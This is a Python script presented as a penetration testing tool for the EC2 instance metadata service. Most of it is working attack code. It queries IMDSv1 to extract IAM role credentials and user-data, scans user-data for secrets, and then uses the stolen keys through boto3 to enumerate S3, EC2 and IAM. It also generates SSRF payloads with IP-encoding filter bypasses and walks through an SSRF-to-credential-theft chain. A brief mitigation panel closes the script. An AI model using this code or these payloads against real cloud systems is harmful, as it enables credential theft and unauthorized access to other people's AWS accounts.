"""
EC2 Metadata Service Exploitation
==================================
Exploits IMDSv1 vulnerabilities to steal credentials.

ATTACK TECHNIQUES:
1. Direct metadata access - Query the metadata service
2. Credential theft - Extract IAM role credentials
3. SSRF exploitation - Access metadata via vulnerable apps
4. Pivot techniques - Use stolen credentials to move laterally
"""

import requests
import json
import sys
import os
import boto3
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.tree import Tree
from rich.syntax import Syntax

console = Console()

# EC2 Metadata Service endpoints
METADATA_BASE = "http://169.254.169.254"
METADATA_ENDPOINTS = {
    'instance-id': '/latest/meta-data/instance-id',
    'instance-type': '/latest/meta-data/instance-type',
    'ami-id': '/latest/meta-data/ami-id',
    'hostname': '/latest/meta-data/hostname',
    'local-ipv4': '/latest/meta-data/local-ipv4',
    'public-ipv4': '/latest/meta-data/public-ipv4',
    'availability-zone': '/latest/meta-data/placement/availability-zone',
    'security-groups': '/latest/meta-data/security-groups',
    'iam-role': '/latest/meta-data/iam/security-credentials/',
    'user-data': '/latest/user-data',
    'identity-document': '/latest/dynamic/instance-identity/document'
}


class MetadataExploiter:
    """EC2 Metadata Service exploitation tool"""
    
    def __init__(self, base_url=METADATA_BASE, timeout=2):
        self.base_url = base_url
        self.timeout = timeout
        self.credentials = None
    
    def is_metadata_accessible(self):
        """Check if metadata service is accessible"""
        try:
            response = requests.get(
                f"{self.base_url}/latest/meta-data/",
                timeout=self.timeout
            )
            return response.status_code == 200
        except:
            return False
    
    def query_metadata(self, path):
        """Query a specific metadata endpoint"""
        try:
            url = f"{self.base_url}{path}"
            response = requests.get(url, timeout=self.timeout)
            if response.status_code == 200:
                return response.text
            return None
        except Exception as e:
            return None
    
    def enumerate_metadata(self):
        """Enumerate all metadata endpoints"""
        results = {}
        
        console.print("\n[bold cyan]Enumerating Metadata Endpoints...[/]")
        
        for name, path in METADATA_ENDPOINTS.items():
            value = self.query_metadata(path)
            if value:
                results[name] = value
                if len(value) > 100:
                    display = value[:100] + '...'
                else:
                    display = value
                console.print(f"  [green]✓[/] {name}: {display}")
            else:
                console.print(f"  [dim]✗ {name}: Not available[/]")
        
        return results
    
    def extract_iam_credentials(self):
        """Extract IAM credentials from metadata"""
        console.print("\n[bold red]EXTRACTING IAM CREDENTIALS...[/]")
        
        # First get the role name
        role_path = METADATA_ENDPOINTS['iam-role']
        role_name = self.query_metadata(role_path)
        
        if not role_name:
            console.print("  [yellow]No IAM role attached to this instance[/]")
            return None
        
        # Clean up role name (remove newlines)
        role_name = role_name.strip()
        console.print(f"  [green]Found IAM Role:[/] {role_name}")
        
        # Get credentials for the role
        creds_path = f"{role_path}{role_name}"
        creds_raw = self.query_metadata(creds_path)
        
        if not creds_raw:
            console.print("  [red]Failed to retrieve credentials[/]")
            return None
        
        try:
            creds = json.loads(creds_raw)
            self.credentials = {
                'AccessKeyId': creds.get('AccessKeyId'),
                'SecretAccessKey': creds.get('SecretAccessKey'),
                'Token': creds.get('Token'),
                'Expiration': creds.get('Expiration'),
                'RoleName': role_name
            }
            
            console.print("\n  [bold red]⚠️  CREDENTIALS EXTRACTED! ⚠️[/]")
            console.print(f"  Access Key ID: [cyan]{self.credentials['AccessKeyId']}[/]")
            console.print(f"  Secret Key: [cyan]{self.credentials['SecretAccessKey'][:10]}...REDACTED[/]")
            console.print(f"  Session Token: [cyan]{self.credentials['Token'][:20]}...REDACTED[/]")
            console.print(f"  Expiration: [yellow]{self.credentials['Expiration']}[/]")
            
            return self.credentials
            
        except json.JSONDecodeError:
            console.print("  [red]Failed to parse credentials JSON[/]")
            return None
    
    def extract_user_data(self):
        """Extract instance user-data (may contain secrets!)"""
        console.print("\n[bold cyan]Extracting User-Data...[/]")
        
        user_data = self.query_metadata('/latest/user-data')
        
        if not user_data:
            console.print("  [dim]No user-data available[/]")
            return None
        
        console.print("  [green]User-data found![/]")
        
        # Check for common secrets in user-data
        secrets_found = []
        secret_patterns = [
            'password', 'secret', 'key', 'token', 'api_key',
            'aws_access', 'aws_secret', 'credential'
        ]
        
        for pattern in secret_patterns:
            if pattern.lower() in user_data.lower():
                secrets_found.append(pattern)
        
        if secrets_found:
            console.print(f"  [red]⚠️  Potential secrets detected: {', '.join(secrets_found)}[/]")
        
        # Display user-data (truncated)
        console.print("\n  [bold]User-Data Content:[/]")
        syntax = Syntax(user_data[:1000], "bash", theme="monokai", line_numbers=True)
        console.print(syntax)
        
        if len(user_data) > 1000:
            console.print(f"  [dim]... truncated ({len(user_data)} total characters)[/]")
        
        return user_data
    
    def test_stolen_credentials(self):
        """Test stolen credentials by making AWS API calls"""
        if not self.credentials:
            console.print("[yellow]No credentials available to test[/]")
            return
        
        console.print("\n[bold cyan]Testing Stolen Credentials...[/]")
        
        try:
            # Create a session with stolen credentials
            session = boto3.Session(
                aws_access_key_id=self.credentials['AccessKeyId'],
                aws_secret_access_key=self.credentials['SecretAccessKey'],
                aws_session_token=self.credentials['Token']
            )
            
            # Test STS
            sts = session.client('sts')
            identity = sts.get_caller_identity()
            console.print(f"  [green]✓ STS GetCallerIdentity:[/] {identity['Arn']}")
            
            # Test S3
            try:
                s3 = session.client('s3')
                buckets = s3.list_buckets()
                console.print(f"  [green]✓ S3 ListBuckets:[/] {len(buckets['Buckets'])} buckets accessible")
            except:
                console.print("  [red]✗ S3 ListBuckets: Access Denied[/]")
            
            # Test EC2
            try:
                ec2 = session.client('ec2')
                instances = ec2.describe_instances(MaxResults=5)
                count = sum(len(r['Instances']) for r in instances['Reservations'])
                console.print(f"  [green]✓ EC2 DescribeInstances:[/] {count} instances visible")
            except:
                console.print("  [red]✗ EC2 DescribeInstances: Access Denied[/]")
            
            # Test IAM
            try:
                iam = session.client('iam')
                users = iam.list_users(MaxItems=5)
                console.print(f"  [green]✓ IAM ListUsers:[/] {len(users['Users'])} users visible")
            except:
                console.print("  [red]✗ IAM ListUsers: Access Denied[/]")
            
            return True
            
        except Exception as e:
            console.print(f"  [red]Error testing credentials:[/] {e}")
            return False
    
    def ssrf_payload_generator(self, target_url=None):
        """Generate SSRF payloads for metadata access"""
        console.print("\n[bold cyan]SSRF Payload Generator[/]")
        console.print("-" * 40)
        
        payloads = {
            'Basic': f'{METADATA_BASE}/latest/meta-data/',
            'Instance ID': f'{METADATA_BASE}/latest/meta-data/instance-id',
            'IAM Credentials': f'{METADATA_BASE}/latest/meta-data/iam/security-credentials/',
            'User Data': f'{METADATA_BASE}/latest/user-data',
            'Identity Doc': f'{METADATA_BASE}/latest/dynamic/instance-identity/document',
            
            # Bypass attempts
            'IPv6': 'http://[::ffff:169.254.169.254]/latest/meta-data/',
            'Decimal IP': 'http://2852039166/latest/meta-data/',
            'Hex IP': 'http://0xa9fea9fe/latest/meta-data/',
            'Octal IP': 'http://0251.0376.0251.0376/latest/meta-data/',
        }
        
        table = Table(title="SSRF Payloads for EC2 Metadata")
        table.add_column("Type", style="cyan")
        table.add_column("Payload", style="green")
        
        for name, payload in payloads.items():
            table.add_row(name, payload)
        
        console.print(table)
        
        if target_url:
            console.print(f"\n[bold]For vulnerable endpoint {target_url}:[/]")
            console.print(f"  {target_url}?url={METADATA_BASE}/latest/meta-data/iam/security-credentials/")
        
        return payloads


def demonstrate_attack():
    """Demonstrate the metadata attack in a simulated environment"""
    console.print(Panel.fit(
        "[bold yellow]📝 ATTACK DEMONSTRATION 📝[/]\n\n"
        "Since we're not running on EC2, this demonstrates\n"
        "how the attack would work in a real scenario.",
        title="Demo Mode"
    ))
    
    console.print("\n[bold cyan]Attack Scenario: SSRF to Credential Theft[/]")
    console.print("="*50)
    
    steps = [
        ("1. Identify SSRF Vulnerability", 
         "Found web app that fetches user-provided URLs:\n"
         "   GET /fetch?url=http://example.com"),
        
        ("2. Probe Metadata Service",
         "Request: GET /fetch?url=http://169.254.169.254/latest/meta-data/\n"
         "Response: Shows metadata categories are accessible!"),
        
        ("3. Identify IAM Role",
         "Request: GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
         "Response: 'webapp-role'"),
        
        ("4. Extract Credentials",
         "Request: GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role\n"
         "Response: {AccessKeyId, SecretAccessKey, Token}"),
        
        ("5. Use Stolen Credentials",
         "export AWS_ACCESS_KEY_ID=ASIAXXX...\n"
         "export AWS_SECRET_ACCESS_KEY=xxx...\n"
         "export AWS_SESSION_TOKEN=xxx...\n"
         "aws s3 ls  # Now accessing S3 as the compromised role!"),
    ]
    
    for title, content in steps:
        console.print(f"\n[bold green]{title}[/]")
        console.print(f"[dim]{content}[/]")
    
    console.print("\n" + "="*50)
    console.print("[bold red]IMPACT: Full access to AWS resources with role permissions![/]")


def main():
    console.print(Panel.fit(
        "[bold red]🎯 EC2 METADATA EXPLOITATION 🎯[/]\n\n"
        "This tool exploits EC2 Instance Metadata Service:\n"
        "• Extract instance information\n"
        "• Steal IAM role credentials\n"
        "• Access user-data (may contain secrets)\n"
        "• Generate SSRF payloads\n\n"
        "[yellow]Note: Full functionality requires running on EC2[/]",
        title="Penetration Testing Tool"
    ))
    
    exploiter = MetadataExploiter()
    
    # Check if we're on EC2
    console.print("\n[bold cyan]Checking if running on EC2...[/]")
    
    if exploiter.is_metadata_accessible():
        console.print("[green]✓ Metadata service accessible - Running on EC2![/]")
        
        # Full exploitation
        metadata = exploiter.enumerate_metadata()
        creds = exploiter.extract_iam_credentials()
        user_data = exploiter.extract_user_data()
        
        if creds:
            exploiter.test_stolen_credentials()
    else:
        console.print("[yellow]✗ Metadata not accessible - Not running on EC2[/]")
        console.print("  Switching to demonstration mode...")
        
        # Show demonstration
        demonstrate_attack()
    
    # Always show SSRF payloads
    exploiter.ssrf_payload_generator()
    
    # Mitigation recommendations
    console.print("\n" + "="*60)
    console.print(Panel.fit(
        "[bold green]🛡️ MITIGATION RECOMMENDATIONS 🛡️[/]\n\n"
        "1. [cyan]Enable IMDSv2[/] - Require session tokens\n"
        "   aws ec2 modify-instance-metadata-options \\\n"
        "     --instance-id i-xxx --http-tokens required\n\n"
        "2. [cyan]Limit hop count[/] - Prevent container access\n"
        "   --http-put-response-hop-limit 1\n\n"
        "3. [cyan]Use VPC endpoints[/] - Avoid SSRF via internal access\n\n"
        "4. [cyan]IAM role scoping[/] - Minimal required permissions\n\n"
        "5. [cyan]Web app hardening[/] - Validate URLs, block internal IPs",
        title="Defense",
        border_style="green"
    ))
    
    console.print("\n[bold green]Exploitation tool complete![/]")


if __name__ == "__main__":
    main()
